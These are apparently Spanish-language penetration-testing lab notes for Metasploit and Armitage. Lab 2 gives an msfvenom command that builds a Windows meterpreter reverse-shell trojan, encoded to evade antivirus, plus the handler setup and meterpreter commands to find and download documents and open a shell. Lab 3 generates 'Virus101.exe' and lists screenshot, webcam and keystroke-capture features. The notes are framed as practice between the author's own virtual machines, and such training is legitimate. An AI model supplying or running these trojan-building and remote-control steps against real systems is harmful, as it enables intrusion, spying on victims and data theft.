## LABORATORIO 1 (INTERACCION BASICA)

1. Podemos ver la carpeta con los archivos de Metasploit Framework  
**_cd /usr/share/metasploit-framework/_**

2. Ahora ejecutamos la consola de Metasploit: **_msfconsole_**
3. Ahora podemos buscar de la siguiente forma: **_search Type: exploit_**
4. Podemos aplicar filtros ejemplo: **_search Type: exploit platform:windows_**
5. Buscar vulnerabilidades comunes: **_search cve:2017_**
6. Quiero atacar un sistema especifico: **_search name:wordpress_**
7. Si queremos usarlo: use &lt;ruta/nombre&gt;  
(**_use exploit/unix/webapp/wp_total_cache_exec_**)
8. Dentro podemos ver los objetivos: **_show targets_**
9. Podemos ver más información: **_show info_**
10. Podemos ver las opciones: **_show Options_**
11. Modificar su opción de IP REMOTE HOST: set RHOST &lt;IP OBJETIVO&gt;
12. Volvemos a ver las opciones con **show Options** y veremos la IP configurada
13. Ahora veremos los Payloads útiles relacionados a este exploit: **_show payloads_**
14. Y podemos usar el payload de igual forma que antes con **_use &lt;name/ruta&gt;_**
15. Dentro podemos ver las opciones del Payload con **_show options_**
16. Y podemos establecer nuestra configuración del LOCAL HOST:  
**_set LHOST &lt;IP MAQUINA ATACANTE&gt;_**
17. Y después de realizar todas las configuraciones de las opciones simplemente ejecutamos: **_exploit_**

Esto no hará nada en específico ya que faltarían más opciones para poder ver un resultado ya que esto solo es una explicación de cómo utilizar Metasploit framework en una prueba de ejemplo.


## LABORATORIO 2 (CREACION DE TROYANO E INFILTRACION A OBJETIVO)

1. En la terminal de Kali levantaremos el servicio PostgreSQL:  
**_service postgresql start_**
2. Y abrimos la consola Metasploit: **_msfconsole_**
3. Ejecutamos: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP KALI&gt; LPORT=&lt;5555&gt; -f exe -e x86/shikata_ga_nai -i 10 > trojan.exe** (Mas adelante explicare cada configuración)
4. Creado el archivo deberíamos tenerlo en /Home por lo que copiaremos y meteremos a la carpeta creada (winmount) en la práctica pasada conectada a la maquina windows para enviar el troyano a la maquina víctima.
5. Ahora en la consola de Metasploit ejecutar: **_use multi/handler_**
6. Luego **_set payload windows/meterpreter/reverse_tcp_**
7. Establecemos el host local: **_set LHOST &lt;IP MAQUINA KALI&gt;_**
8. Y el Puerto: **_set LPORT 5555_**
9. Y ejecutamos: **_exploit_**
10. Regresamos a la maquina windows y volvemos a ejecutar el troyano
11. Abierto el nuevo menú de meterpreter al establecer conexión con la maquina victima vemos la ayuda con el comando **_help_**
12. Si queremos ver información del equipo ejecutamos: **_sysinfo_**
13. Si queremos ver el directorio en el que estamos en la maquina windows a través de Kali: _ls_
14. Para ver configuraciones de red: **_ipconfig_**
15. Queremos buscar los archivos (.doc) en la maquina: **_search -f \*.doc_**
16. Igual se puede con cualquier otro archivo, como ejemplo (.txt)
17. Y si queremos descargarlo: download &lt;dirección del documento&gt; (Recuerda cambiar las barras a (/))
18. Y de igual forma podemos subir un archivo**_: upload &lt;dirección origen kali&gt; &lt;dirección destino windows&gt;_** (Utilizando (\\) en esta última)
19. Usar la consola de windows: **_Shell_**

EXTRA

- El comando **msfvenom** es el comando principal de Metasploit Framework que se utiliza para generar payloads personalizados.
- **(-p windows/meterpreter/reverse_tcp**) Especifica el payload que se utilizara, en este caso es un payload para windows que establece una conexión de Shell inversa usando el módulo Meterpreter de Metasploit Framework.
- **LHOST=&lt;IP KALI&gt;** Especifica la dirección IP del host atacante, es decir, la dirección IP de Kali Linux, donde se enviarán las conexiones de retorno del sistema objetivo.
- **LPORT=&lt;5555&gt;** Esta opción especifica el puerto en el que escuchará el sistema Kali Linux para las conexiones de retorno del sistema objetivo. Aquí, estamos utilizando el puerto 5555, pero puedes cambiarlo según tus necesidades.
- **(-f exe)** Esta opción especifica el formato de salida del payload generado. En este caso, estamos generando un archivo ejecutable de Windows (.exe).
- **(-e x86/shikata_ga_nai)** Esta opción especifica el encoder que se utilizará para codificar el payload y evadir la detección de antivirus. En este caso, estamos utilizando el encoder x86/shikata_ga_nai, que es un encoder polimórfico disponible en Metasploit Framework.
- **(-i 10)** Esta opción especifica el número de iteraciones que se utilizarán para codificar el payload. Cuantas más iteraciones, más difícil será para los antivirus detectar el payload. Aquí, estamos utilizando 10 iteraciones.
- **(> trojan.exe)** Esta parte del comando redirige la salida del payload generado al archivo trojan.exe, que es el nombre del archivo que se generará y que contendrá el payload.
- **use multi/handler:** Este comando indica a Metasploit que se utilizará el módulo multi/handler, el cual es responsable de escuchar las conexiones entrantes de varios tipos de payloads. Seleccionar este módulo prepara Metasploit para recibir la conexión que será establecida por el payload que generamos previamente con msfvenom.
- **set payload windows/meterpreter/reverse_tcp**: Este comando configura el tipo de payload que se espera recibir en el handler. En este caso, estamos configurando el payload para Windows que establece una conexión de Shell inversa usando el módulo Meterpreter de Metasploit Framework y el método reverse_tcp.


## LABORATORIO 3 (INTERACCION CON LA HERRAMIENTA ARMITAGE)

1. Levantar el servicio postgresql en la terminal
2. Ejecutamos Armitage: **_armitage_**
3. Damos clic en **Connect** y **Yes**
4. Se mostrará la interfaz GUI con 3 Paneles
5. Nos vamos a la opción **Armitage>Preferences**
6. Buscamos la opción con nombre **require_exploit_rank** y el valor lo cambiamos a **poor**
7. Ahora comenzaremos escaneando los hosts en **Hosts>Nmap Scan>Quick Scan (OS detect)**
8. Ingresamos el rango de la LAN en mi caso es (192.168.0.0/24) y se nos mostraran las maquinas en la red
9. Podemos seleccionar la maquina objetivo y con clic derecho ver los servicios
10. También seleccionándola y en las opciones superiores **Attacks>Find Attacks**
11. Ahora con clic derecho a la maquina objetivo tendremos la opción **Attack** con una variedad de ataques para la máquina.
12. Ahora crearemos un payload en el panel izquierdo **payload>windows>meterpreter>reverse_tcp**
13. Abierto el menú yo elegiré el **LPORT 9090**
14. En **Output** elegiremos **exe** y finalmente **Launch**
15. Y guardaremos el documento en el escritorio con el nombre **Virus101.exe**
16. En nuestro caso lo volvemos a mandar por la carpeta compartida entre las 2 máquinas de la practica 5.8
17. De nuevo en Armitage abrimos el documento de antes (reverse_tcp), elegimos el puerto 9090, Output multi/handler y Launch
18. Ahora ejecutamos el virus en la maquina windows
19. Y ahora el Logo de la maquina windows habrá cambiado al igual de la nueva consola
![IMAGEN DEL LOGO DE EJEMPLO](../assets/image53.png)
20. Y tendremos una nueva opción llamada **Meterpreter 1** al dar clic derecho en la maquina
21. De los cuales podremos usar para Explorar Archivos en la máquina, abrir su Shell de comandos, tomar capturas de pantalla, abrir su webcam, o podemos observar las pulsaciones de tecla(Esta última va a tardar un poco en iniciar)
